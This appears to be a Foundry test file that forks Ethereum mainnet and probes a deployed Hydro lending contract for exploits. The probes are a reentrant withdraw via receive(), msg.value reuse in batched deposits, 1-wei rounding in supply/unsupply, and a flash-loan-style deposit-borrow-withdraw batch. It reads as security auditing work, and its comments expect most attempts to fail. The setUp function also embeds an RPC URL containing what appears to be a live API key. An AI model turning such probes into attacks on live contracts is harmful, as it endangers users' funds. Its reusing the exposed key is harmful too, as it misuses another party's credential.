// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

// Minimal interfaces for Hydro
interface IHydro {
    function batch(Action[] memory actions) external payable;

    struct Action {
        uint8 actionType;  // 0=Deposit, 1=Withdraw, 2=Transfer, 3=Borrow, 4=Repay, 5=Supply, 6=Unsupply
        bytes encodedParams;
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract HydroExploitTest is Test {
    address constant HYDRO = 0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant ETH_ADDR = 0x000000000000000000000000000000000000000E;

    function setUp() public {
        // Fork mainnet at latest block
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
    }

    // Test 1: Can we exploit the withdraw-before-state pattern via ETH reentrancy?
    // Even with .transfer() 2300 gas limit, let's verify.
    function test_ethWithdrawReentrancy() public {
        uint256 depositAmount = 1 ether;
        deal(address(this), 100 ether);

        // Step 1: Deposit ETH
        IHydro.Action[] memory actions = new IHydro.Action[](1);
        actions[0] = IHydro.Action({
            actionType: 0, // Deposit
            encodedParams: abi.encode(ETH_ADDR, depositAmount)
        });

        IHydro(HYDRO).batch{value: depositAmount}(actions);
        console.log("After deposit, contract ETH:", address(HYDRO).balance);

        // Step 2: Try to withdraw - our receive() will attempt reentrancy
        reentrancyAttempted = false;
        actions[0] = IHydro.Action({
            actionType: 1, // Withdraw
            encodedParams: abi.encode(ETH_ADDR, depositAmount)
        });

        // This should revert if reentrancy succeeds (unlikely with 2300 gas)
        IHydro(HYDRO).batch(actions);
        console.log("Reentrancy attempted:", reentrancyAttempted);
        console.log("Reentrancy succeeded:", reentrancySucceeded);
    }

    bool public reentrancyAttempted;
    bool public reentrancySucceeded;

    receive() external payable {
        if (!reentrancyAttempted) {
            reentrancyAttempted = true;
            // Try to reenter with a withdraw
            IHydro.Action[] memory actions = new IHydro.Action[](1);
            actions[0] = IHydro.Action({
                actionType: 1,
                encodedParams: abi.encode(ETH_ADDR, msg.value)
            });
            try IHydro(HYDRO).batch(actions) {
                reentrancySucceeded = true;
            } catch {
                // Expected: not enough gas or state check fails
            }
        }
    }

    // Test 2: Check if batch allows msg.value reuse across deposits
    function test_batchMsgValueReuse() public {
        uint256 amount = 1 ether;
        deal(address(this), 10 ether);

        // Try to deposit msg.value twice in one batch
        IHydro.Action[] memory actions = new IHydro.Action[](2);
        actions[0] = IHydro.Action({
            actionType: 0,
            encodedParams: abi.encode(ETH_ADDR, amount)
        });
        actions[1] = IHydro.Action({
            actionType: 0,
            encodedParams: abi.encode(ETH_ADDR, amount)
        });

        // This should revert because totalDepositedEtherAmount (2 ETH) != msg.value (1 ETH)
        vm.expectRevert();
        IHydro(HYDRO).batch{value: amount}(actions);
        console.log("MSG_VALUE reuse correctly prevented");
    }

    // Test 3: Check if zero-amount supply/unsupply has any edge cases
    function test_zeroAmountEdgeCases() public {
        deal(address(this), 10 ether);

        // Deposit 1 ETH first
        IHydro.Action[] memory actions = new IHydro.Action[](1);
        actions[0] = IHydro.Action({
            actionType: 0,
            encodedParams: abi.encode(ETH_ADDR, 1 ether)
        });
        IHydro(HYDRO).batch{value: 1 ether}(actions);

        // Try supply 0
        actions[0] = IHydro.Action({
            actionType: 5, // Supply
            encodedParams: abi.encode(ETH_ADDR, uint256(0))
        });
        try IHydro(HYDRO).batch(actions) {
            console.log("Zero supply succeeded");
        } catch {
            console.log("Zero supply reverted");
        }

        // Try supply 1 wei
        actions[0] = IHydro.Action({
            actionType: 5,
            encodedParams: abi.encode(ETH_ADDR, uint256(1))
        });
        try IHydro(HYDRO).batch(actions) {
            console.log("1 wei supply succeeded");

            // Now try unsupply 1 wei - check if rounding gives us more
            actions[0] = IHydro.Action({
                actionType: 6, // Unsupply
                encodedParams: abi.encode(ETH_ADDR, uint256(1))
            });
            try IHydro(HYDRO).batch(actions) {
                console.log("1 wei unsupply succeeded");
            } catch {
                console.log("1 wei unsupply reverted");
            }
        } catch {
            console.log("1 wei supply reverted");
        }
    }

    // Test 4: Flash loan style - deposit, supply, borrow in one batch
    function test_flashLoanStyleBatch() public {
        deal(address(this), 100 ether);

        // Try: deposit ETH -> supply ETH -> transfer to collateral -> borrow USDT
        // This is Market 0: ETH/USDT
        IHydro.Action[] memory actions = new IHydro.Action[](4);

        // Step 1: Deposit 10 ETH
        actions[0] = IHydro.Action({
            actionType: 0,
            encodedParams: abi.encode(ETH_ADDR, 10 ether)
        });

        // Step 2: Transfer to collateral account (market 0)
        // BalancePath: { category: 1 (CollateralAccount), marketID: 0, user: address(this) }
        // encodedParams: (asset, fromPath, toPath, amount)
        bytes memory fromPath = abi.encode(uint8(0), uint16(0), address(this)); // Common account
        bytes memory toPath = abi.encode(uint8(1), uint16(0), address(this));   // Collateral account market 0
        actions[1] = IHydro.Action({
            actionType: 2, // Transfer
            encodedParams: abi.encode(ETH_ADDR, fromPath, toPath, 10 ether)
        });

        // Step 3: Borrow USDT from market 0
        actions[2] = IHydro.Action({
            actionType: 3, // Borrow
            encodedParams: abi.encode(uint16(0), USDT, 1000 * 1e6) // Borrow 1000 USDT
        });

        // Step 4: Withdraw USDT
        actions[3] = IHydro.Action({
            actionType: 1, // Withdraw
            encodedParams: abi.encode(USDT, 1000 * 1e6)
        });

        uint256 usdtBefore = IERC20(USDT).balanceOf(address(this));
        console.log("USDT before:", usdtBefore);

        try IHydro(HYDRO).batch{value: 10 ether}(actions) {
            uint256 usdtAfter = IERC20(USDT).balanceOf(address(this));
            console.log("USDT after:", usdtAfter);
            console.log("Successfully borrowed USDT with ETH collateral");
        } catch (bytes memory reason) {
            console.log("Batch failed (expected - encoding may be wrong)");
            console.logBytes(reason);
        }
    }
}
